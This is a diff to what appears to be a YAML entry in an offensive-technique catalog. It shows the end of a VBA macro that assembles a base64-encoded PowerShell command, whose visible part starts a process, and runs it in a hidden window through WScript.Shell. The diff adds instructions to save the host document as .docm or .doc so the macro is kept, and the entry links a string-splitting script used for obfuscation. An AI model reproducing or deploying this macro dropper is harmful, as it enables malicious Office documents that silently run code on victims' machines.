@@ -34,11 +34,13 @@ functions:
             Str = Str + "AdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAb"
             Str = Str + "wBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA"
 
-            Set objShell = WScript.CreateObject("WScript.Shell")
+            Set objShell = CreateObject("WScript.Shell")
             objShell.Run Str, 0, True
             
 
             End Sub
+
+            NOTE: You must save the containing document as either .docm or the older .doc format, which supports embedded macros, but must avoid the .docx format, which does not support them.
 
 resources : |
   https://github.com/unkn0wnsyst3m/scripts/blob/master/splitstr.py
